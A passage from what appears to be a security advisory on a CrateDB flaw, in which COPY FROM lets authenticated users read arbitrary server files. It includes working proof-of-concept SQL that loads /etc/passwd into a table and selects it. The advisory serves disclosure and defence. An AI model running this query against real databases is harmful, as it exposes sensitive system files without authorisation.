into database tables. This function has a flaw, and authenticated attackers can abuse
the `COPY FROM` function to read arbitrary files from the underlying operating system,
resulting in sensitive information disclosure.

CREATE TABLE info_leak (
    info_leak STRING
);

COPY info_leak FROM '/etc/passwd'
WITH (
    format = 'csv',
    header = false
);

SELECT * FROM info_leak;
```

## Impact

Attackers who exploit this vulnerability to obtain sensitive information may carry out further attacks, 
while also affecting CrateDB Cloud Clusters.
